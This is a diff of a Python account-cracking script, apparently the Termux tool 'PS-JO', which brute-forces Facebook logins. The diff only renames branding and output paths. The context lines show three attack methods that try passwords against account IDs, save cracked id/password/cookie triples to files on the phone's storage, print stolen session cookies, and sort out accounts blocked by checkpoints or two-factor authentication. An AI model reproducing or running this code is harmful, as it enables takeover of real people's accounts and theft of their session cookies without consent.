@@ -51,7 +51,7 @@ except ImportError as e:
         print(f"{R}━"*56)
         sys.exit()
 #----------------\<-SYS->/----------------#
-sys.stdout.write('\x1b[1;37m\x1b]2; PS~JO\x07')
+sys.stdout.write('\x1b[1;37m\x1b]2; PS~\x07')
 #----------------\<-FILE-PATH->/----------------#
 
 #----------------\<-DATE->/----------------#
@@ -335,7 +335,7 @@ class __PSJO__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{R}<[{W}PS{R}-{W}JO{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M1{R}]>'
+                f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M1{R}]>'
                 f'{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
             )
             sys.stdout.flush()
@@ -444,7 +444,7 @@ class __PSJO__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{R}<{W}[{R}COOKIE{W}]{R}> {colorX}{cookie}')
-                    open('/sdcard/PS-JO/FILE/PS-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/PS-/FILE/PS-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M1 : {ids}|{pas}|{cookie}"
@@ -455,7 +455,7 @@ class __PSJO__:
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<{W}[{R}PS-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')
 
-                    open('/sdcard/PS-JO/FILE/PS-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/PS-/FILE/PS-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
 
@@ -463,7 +463,7 @@ class __PSJO__:
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                         
-                    open('/sdcard/PS-JO/FILE/PS-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/PS-/FILE/PS-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -486,7 +486,7 @@ class __PSJO__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{R}<[{W}PS{R}-{W}JO{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M2{R}]>{W}-{R}<[{R}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
+                f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M2{R}]>{W}-{R}<[{R}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
             )
             sys.stdout.flush()
             fn = names.split(' ')[0]
@@ -577,7 +577,7 @@ class __PSJO__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{R}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/PS-JO/FILE/PS-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/PS-/FILE/PS-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M2 : {ids}|{pas}|{cookie}"
@@ -587,14 +587,14 @@ class __PSJO__:
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
 
-                    open('/sdcard/PS-JO/FILE/PS-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/PS-/FILE/PS-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error']['message']:
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                         
-                    open('/sdcard/PS-JO/FILE/PS-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/PS-/FILE/PS-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -617,7 +617,7 @@ class __PSJO__:
                 "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
             ])
             sys.stdout.write(
-                f'\r{xp}{W}-{R}<[{W}PS{R}-{W}JO{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M3{R}]>{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
+                f'\r{xp}{W}-{R}<[{W}PS{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M3{R}]>{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
             )
             sys.stdout.flush()
             fn = names.split(' ')[0]
@@ -704,7 +704,7 @@ class __PSJO__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{R}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/PS-JO/FILE/PS-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/PS-/FILE/PS-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M3 : {ids}|{pas}|{cookie}"
@@ -714,14 +714,14 @@ class __PSJO__:
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
 
-                    open('/sdcard/PS-JO/FILE/PS-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/PS-/FILE/PS-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error']['message']:
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{R}<[{W}PS-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                         
-                    open('/sdcard/PS-JO/FILE/PS-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/PS-/FILE/PS-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
